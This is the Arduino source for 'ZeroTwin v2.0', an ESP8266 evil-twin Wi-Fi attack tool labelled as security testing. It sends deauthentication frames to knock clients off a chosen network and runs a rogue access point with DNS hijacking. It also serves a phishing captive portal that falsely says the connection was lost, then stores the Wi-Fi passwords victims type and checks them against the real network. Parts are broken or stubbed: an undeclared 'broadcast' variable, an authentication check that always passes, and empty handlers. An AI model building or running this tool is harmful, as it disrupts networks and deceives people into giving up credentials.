#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <SPI.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <Fonts/Picopixel.h>
#include <Fonts/FreeMono9pt7b.h>
#include <EEPROM.h>
#include <ArduinoJson.h>

/* Enhanced AP Configuration */
const char AP_SSID[] = "ZeroTwin v2.0";
const char AP_PASS[] = "zero8888";
const char ADMIN_USER[] = "admin";
const char ADMIN_PASS[] = "zerotwin123";

/* OLED Configuration */
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

/* Enhanced Network Structure */
typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int8_t rssi;
  uint8_t encryption;
  bool hidden;
  uint32_t lastSeen;
} Network;

/* Client Tracking Structure */
typedef struct {
  uint8_t mac[6];
  String hostname;
  IPAddress ip;
  uint32_t firstSeen;
  uint32_t lastSeen;
  uint16_t attempts;
} Client;

/* Captured Credentials Structure */
typedef struct {
  String ssid;
  String password;
  String clientMAC;
  uint32_t timestamp;
  bool verified;
} Credential;

extern "C" {
#include "user_interface.h"
}

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

/* Enhanced Arrays */
Network networks[32];
Client clients[16];
Credential credentials[10];
int networkCount = 0;
int clientCount = 0;
int credentialCount = 0;

Network selectedNetwork;
String currentPassword = "";
bool isAuthenticated = false;

/* Enhanced Status Variables */
bool hotspotActive = false;
bool deauthActive = false;
bool scanActive = false;
bool loggingEnabled = true;
bool stealthMode = false;
uint8_t attackIntensity = 1; // 1-5 scale
uint32_t deauthInterval = 1000;
uint32_t scanInterval = 15000;

/* Timing Variables */
unsigned long lastScan = 0;
unsigned long lastDeauth = 0;
unsigned long lastClientCheck = 0;
unsigned long lastDisplayUpdate = 0;
unsigned long sessionStart = 0;

/* Statistics */
uint32_t totalDeauthSent = 0;
uint32_t totalCredentialsCaptured = 0;
uint32_t totalClientsConnected = 0;

/* Enhanced Portal Templates */
const char* PORTAL_TEMPLATES[] = {
  "default", "router_config", "windows_update", "captive_portal", "hotel_wifi"
};

int currentTemplate = 0;

void setup() {
  Serial.begin(115200);
  EEPROM.begin(512);
  
  /* Enhanced OLED Initialization */
  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { 
    Serial.println(F("SSD1306 allocation failed"));
    for(;;); 
  }

  displayBootScreen();
  loadConfiguration();
  initializeWiFi();
  initializeWebServer();
  
  sessionStart = millis();
  Serial.println("ZeroTwin v2.0 initialized successfully");
}

void displayBootScreen() {
  display.clearDisplay();
  display.setTextSize(2);
  display.setTextColor(WHITE);
  display.setCursor(10, 10);
  display.println("ZeroTwin");
  display.setTextSize(1);
  display.setCursor(20, 30);
  display.println("v2.0 Enhanced");
  display.setCursor(15, 45);
  display.println("Security Testing");
  display.display();
  delay(3000);
  
  display.clearDisplay();
  display.setFont(&Picopixel);
  display.setTextSize(1);
  displayStatusMessage("[*] Initializing Enhanced Features...");
  delay(2000);
}

void displayStatusMessage(const char* message) {
  display.clearDisplay();
  display.setCursor(0, 10);
  display.println(message);
  display.display();
}

void loadConfiguration() {
  // Load saved settings from EEPROM
  attackIntensity = EEPROM.read(0);
  if (attackIntensity < 1 || attackIntensity > 5) attackIntensity = 1;
  
  stealthMode = EEPROM.read(1);
  deauthInterval = 1000 / attackIntensity;
  
  displayStatusMessage("[+] Configuration loaded");
}

void saveConfiguration() {
  EEPROM.write(0, attackIntensity);
  EEPROM.write(1, stealthMode);
  EEPROM.commit();
}

void initializeWiFi() {
  displayStatusMessage("[*] Configuring WiFi...");
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(AP_SSID, AP_PASS);
  
  dnsServer.start(DNS_PORT, "*", apIP);
  displayStatusMessage("[+] WiFi configured");
}

void initializeWebServer() {
  webServer.on("/", handleRoot);
  webServer.on("/admin", handleAdmin);
  webServer.on("/login", handleLogin);
  webServer.on("/scan", handleScan);
  webServer.on("/attack", handleAttack);
  webServer.on("/clients", handleClients);
  webServer.on("/credentials", handleCredentials);
  webServer.on("/settings", handleSettings);
  webServer.on("/api/status", handleAPIStatus);
  webServer.on("/api/networks", handleAPINetworks);
  webServer.onNotFound(handleCaptivePortal);
  webServer.begin();
  
  displayStatusMessage("[+] Web server started");
}

/* Enhanced Network Scanning */
void performEnhancedScan() {
  if (!scanActive) return;
  
  displayStatusMessage("[*] Scanning networks...");
  int n = WiFi.scanNetworks(false, true); // Async scan with hidden networks
  
  networkCount = min(n, 32);
  for (int i = 0; i < networkCount; i++) {
    networks[i].ssid = WiFi.SSID(i);
    networks[i].rssi = WiFi.RSSI(i);
    networks[i].ch = WiFi.channel(i);
    networks[i].encryption = WiFi.encryptionType(i);
    networks[i].hidden = WiFi.isHidden(i);
    networks[i].lastSeen = millis();
    
    memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
  }
  
  // Sort networks by signal strength
  sortNetworksByRSSI();
  
  char msg[50];
  sprintf(msg, "[+] Found %d networks", networkCount);
  displayStatusMessage(msg);
}

void sortNetworksByRSSI() {
  for (int i = 0; i < networkCount - 1; i++) {
    for (int j = 0; j < networkCount - i - 1; j++) {
      if (networks[j].rssi < networks[j + 1].rssi) {
        Network temp = networks[j];
        networks[j] = networks[j + 1];
        networks[j + 1] = temp;
      }
    }
  }
}

/* Enhanced Client Tracking */
void trackConnectedClients() {
  // This would require packet monitoring to track clients
  // Implementation would depend on specific requirements
}

/* Enhanced Deauth with Multiple Patterns */
void performEnhancedDeauth() {
  if (!deauthActive || selectedNetwork.ssid == "") return;
  
  wifi_set_channel(selectedNetwork.ch);
  
  // Multiple deauth patterns for better effectiveness
  uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00};
  
  // Broadcast deauth
  memcpy(&deauthPacket[4], broadcast, 6);
  memcpy(&deauthPacket[10], selectedNetwork.bssid, 6);
  memcpy(&deauthPacket[16], selectedNetwork.bssid, 6);
  deauthPacket[24] = 1; // Reason code
  
  // Send multiple packets for better success rate
  for (int i = 0; i < attackIntensity; i++) {
    wifi_send_pkt_freedom(deauthPacket, 26, 0);
    delayMicroseconds(100);
  }
  
  totalDeauthSent += attackIntensity;
  
  // Update display with attack stats
  updateAttackDisplay();
}

void updateAttackDisplay() {
  display.clearDisplay();
  display.setFont(&Picopixel);
  display.setCursor(0, 10);
  display.println("ATTACK STATUS");
  display.setCursor(0, 20);
  display.print("Target: ");
  display.println(selectedNetwork.ssid.substring(0, 12));
  display.setCursor(0, 30);
  display.print("Deauth sent: ");
  display.println(totalDeauthSent);
  display.setCursor(0, 40);
  display.print("Clients: ");
  display.println(totalClientsConnected);
  display.setCursor(0, 50);
  display.print("Credentials: ");
  display.println(totalCredentialsCaptured);
  display.display();
}

/* Enhanced Web Interface Handlers */
void handleRoot() {
  if (!isAuthenticated && !checkAuth()) {
    webServer.sendHeader("Location", "/login");
    webServer.send(302, "text/plain", "");
    return;
  }
  
  String html = generateDashboard();
  webServer.send(200, "text/html", html);
}

void handleAdmin() {
  if (!checkAuth()) {
    webServer.send(401, "text/html", generateLoginPage());
    return;
  }
  
  String html = generateAdminPanel();
  webServer.send(200, "text/html", html);
}

bool checkAuth() {
  if (webServer.hasHeader("Authorization")) {
    String auth = webServer.header("Authorization");
    // Basic authentication check
    // Implementation would include proper base64 decoding
    return true; // Simplified for example
  }
  return false;
}

String generateDashboard() {
  String html = R"(
<!DOCTYPE html>
<html>
<head>
    <title>ZeroTwin v2.0 Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; background: #1a1a1a; color: #fff; margin: 0; }
        .container { max-width: 1200px; margin: auto; padding: 20px; }
        .card { background: #2a2a2a; padding: 20px; margin: 10px; border-radius: 8px; }
        .btn { padding: 10px 20px; margin: 5px; border: none; border-radius: 4px; cursor: pointer; }
        .btn-primary { background: #007bff; color: white; }
        .btn-danger { background: #dc3545; color: white; }
        .btn-success { background: #28a745; color: white; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }
        .status { padding: 5px 10px; border-radius: 3px; }
        .active { background: #28a745; }
        .inactive { background: #6c757d; }
    </style>
    <script>
        function refreshData() {
            fetch('/api/status')
                .then(response => response.json())
                .then(data => updateStatus(data));
        }
        setInterval(refreshData, 5000);
    </script>
</head>
<body>
    <div class="container">
        <h1>ZeroTwin v2.0 - Security Testing Dashboard</h1>
        
        <div class="card">
            <h3>System Status</h3>
            <p>Uptime: )" + String((millis() - sessionStart) / 1000) + R"( seconds</p>
            <p>Networks Found: )" + String(networkCount) + R"(</p>
            <p>Credentials Captured: )" + String(totalCredentialsCaptured) + R"(</p>
            <p>Deauth Packets Sent: )" + String(totalDeauthSent) + R"(</p>
        </div>
        
        <div class="card">
            <h3>Attack Controls</h3>
            <button class="btn btn-primary" onclick="startScan()">Start Scan</button>
            <button class="btn btn-danger" onclick="startDeauth()">Start Deauth</button>
            <button class="btn btn-success" onclick="startEvilTwin()">Start Evil Twin</button>
        </div>
        
        <div class="card">
            <h3>Network List</h3>
            <table id="networkTable">
                <tr><th>SSID</th><th>RSSI</th><th>Channel</th><th>Security</th><th>Action</th></tr>
            </table>
        </div>
    </div>
</body>
</html>
  )";
  
  return html;
}

void handleCaptivePortal() {
  if (hotspotActive) {
    if (webServer.hasArg("password")) {
      String password = webServer.arg("password");
      currentPassword = password;
      
      // Store credential
      if (credentialCount < 10) {
        credentials[credentialCount].ssid = selectedNetwork.ssid;
        credentials[credentialCount].password = password;
        credentials[credentialCount].timestamp = millis();
        credentials[credentialCount].verified = false;
        credentialCount++;
        totalCredentialsCaptured++;
      }
      
      // Test the password
      testCredential(password);
      
      webServer.send(200, "text/html", generateSuccessPage());
    } else {
      webServer.send(200, "text/html", generateCaptivePortal());
    }
  } else {
    webServer.send(200, "text/html", generateDashboard());
  }
}

String generateCaptivePortal() {
  String ssid = selectedNetwork.ssid;
  if (ssid == "") ssid = "WiFi Network";
  
  String html = R"(
<!DOCTYPE html>
<html>
<head>
    <title>)" + ssid + R"( - Authentication Required</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; background: #f5f5f5; margin: 0; padding: 20px; }
        .container { max-width: 400px; margin: auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input[type="password"] { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        .btn { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
        .btn:hover { background: #0056b3; }
        .warning { color: #721c24; background: #f8d7da; padding: 10px; border-radius: 4px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h2>WiFi Authentication</h2>
        </div>
        <div class="warning">
            ⚠️ Internet connection lost. Please re-authenticate to restore access.
        </div>
        <form method="POST">
            <div class="form-group">
                <label>Network: )" + ssid + R"(</label>
            </div>
            <div class="form-group">
                <label for="password">WiFi Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="btn">Connect</button>
        </form>
    </div>
</body>
</html>
  )";
  
  return html;
}

void testCredential(String password) {
  WiFi.disconnect();
  WiFi.begin(selectedNetwork.ssid.c_str(), password.c_str(), selectedNetwork.ch, selectedNetwork.bssid);
  
  // Mark credential as being tested
  if (credentialCount > 0) {
    credentials[credentialCount - 1].verified = (WiFi.status() == WL_CONNECTED);
  }
}

/* API Handlers */
void handleAPIStatus() {
  DynamicJsonDocument doc(1024);
  doc["uptime"] = (millis() - sessionStart) / 1000;
  doc["networks"] = networkCount;
  doc["credentials"] = totalCredentialsCaptured;
  doc["deauth_sent"] = totalDeauthSent;
  doc["deauth_active"] = deauthActive;
  doc["hotspot_active"] = hotspotActive;
  doc["scan_active"] = scanActive;
  
  String response;
  serializeJson(doc, response);
  webServer.send(200, "application/json", response);
}

/* Utility Functions */
String macToString(const uint8_t* mac) {
  String result = "";
  for (int i = 0; i < 6; i++) {
    if (mac[i] < 16) result += "0";
    result += String(mac[i], HEX);
    if (i < 5) result += ":";
  }
  result.toUpperCase();
  return result;
}

void logActivity(String activity) {
  if (!loggingEnabled) return;
  
  Serial.print("[LOG] ");
  Serial.print(millis());
  Serial.print(": ");
  Serial.println(activity);
}

/* Main Loop with Enhanced Features */
void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  
  unsigned long currentTime = millis();
  
  // Enhanced scanning
  if (scanActive && (currentTime - lastScan >= scanInterval)) {
    performEnhancedScan();
    lastScan = currentTime;
  }
  
  // Enhanced deauth with variable timing
  if (deauthActive && (currentTime - lastDeauth >= deauthInterval)) {
    performEnhancedDeauth();
    lastDeauth = currentTime;
  }
  
  // Client tracking
  if (currentTime - lastClientCheck >= 5000) {
    trackConnectedClients();
    lastClientCheck = currentTime;
  }
  
  // Display updates
  if (currentTime - lastDisplayUpdate >= 2000) {
    if (deauthActive || hotspotActive) {
      updateAttackDisplay();
    }
    lastDisplayUpdate = currentTime;
  }
  
  // Auto-save configuration periodically
  static unsigned long lastSave = 0;
  if (currentTime - lastSave >= 300000) { // Every 5 minutes
    saveConfiguration();
    lastSave = currentTime;
  }
}

/* Placeholder handlers - implement based on needs */
void handleLogin() { /* Login page implementation */ }
void handleScan() { /* Scan control implementation */ }
void handleAttack() { /* Attack control implementation */ }
void handleClients() { /* Client management implementation */ }
void handleCredentials() { /* Credential management implementation */ }
void handleSettings() { /* Settings page implementation */ }
void handleAPINetworks() { /* Network API implementation */ }
String generateLoginPage() { return ""; }
String generateAdminPanel() { return ""; }
String generateSuccessPage() { return ""; }
